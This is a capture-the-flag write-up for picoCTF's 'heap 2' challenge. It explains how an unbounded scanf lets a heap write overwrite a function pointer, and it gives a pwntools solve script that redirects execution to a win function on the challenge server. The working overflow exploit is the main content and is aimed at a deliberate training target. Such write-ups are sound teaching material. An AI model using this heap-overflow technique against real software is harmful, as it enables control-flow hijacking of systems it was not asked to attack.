# heap 2

The goal of this challenge from [picoCTF](https://play.picoctf.org/practice/challenge/435) is to overwrite a function pointer.

Running the binnary, we get this:

```
I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x14676b0  ->   pico
+-------------+-----------+
[*]   0x14676d0  ->   bico

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 4
[1]    10086 segmentation fault (core dumped)  ./chall
```

When we try to get the flag, the program crash. Let's look at the source code to see why.

```c
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}
```

```c
void check_win() { ((void (*)())*(int*)x)(); }
```

We can see that the `check_win` basically call the function stored at the `x` adress. So, to retrieve the flag we will need to change the value of `x`with the adress of the `win` function.

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

We can see that the `write_buffer` function use `scanf` so we can easily overide `x`.


# Exploitation

First we need the adress of the `win` function.
We can retrieve it using objdump:

```
❯ objdump -D chall | grep win
00000000004011a0 <win>:
00000000004011f0 <check_win>:
```

Looking at the heap, we can see that the two adresses are separed by 32 bytes so we will need to fills 32 bytes before overwriting `x`.

```
+-------------+-----------+
[*]   0x218c6b0  ->   pico
+-------------+-----------+
[*]   0x218c6d0  ->   bico
```

# Solve

```py
from pwn import *

payload = b'A'*32 + p64(0x00000000004011a0)

r = remote('mimas.picoctf.net', 53506)

r.recvuntil(b"Enter your choice:")
r.sendline(b'2')
r.recvuntil(b"Data for buffer:")
r.sendline(payload)

r.recvuntil(b"Enter your choice:")
r.sendline(b'4')
print(r.recvall().decode())
```